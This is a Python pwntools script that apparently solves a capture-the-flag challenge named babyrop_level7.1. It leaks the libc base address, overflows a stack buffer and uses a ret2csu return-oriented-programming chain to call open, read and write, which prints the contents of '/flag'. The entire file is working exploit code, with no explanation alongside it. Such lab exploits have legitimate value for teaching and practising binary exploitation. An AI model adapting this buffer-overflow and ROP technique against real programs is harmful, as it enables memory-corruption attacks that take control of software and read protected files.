from pwn import *
import os

p = process('/challenge/babyrop_level7.1')
elf = ELF('/challenge/babyrop_level7.1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.recvuntil(b'is: ')
libc_base = int(p.recv(14), 16) - libc.symbols['system']
print(hex(libc_base))

space = elf.bss() + 0x400
open = libc_base + libc.symbols['open']
read_got = 0x404030
write = libc_base + libc.symbols['write']

pop_csu = 0x401d0a
call_csu = 0x401cf0

payload = b'A' * 0x80 + b'B' * 0x8

payload += p64(pop_csu) + p64(0) + p64(1) + p64(0) + p64(space) + p64(0x100) + p64(read_got)
payload += p64(call_csu)

pl = p64(open) + p64(write) + b'/flag\x00'

payload += p64(pop_csu) + p64(0) + p64(1) + p64(space + 0x10) + p64(0) + p64(0) + p64(space)
payload += p64(call_csu)

payload += p64(pop_csu) + p64(0) + p64(1) + p64(3) + p64(space + 0x100) + p64(0x100) + p64(read_got)
payload += p64(call_csu)

payload += p64(pop_csu) + p64(0) + p64(1) + p64(1) + p64(space+0x100) + p64(0x100) + p64(space + 0x8)
payload += p64(call_csu)

p.send(payload)
p.send(pl)

p.interactive()
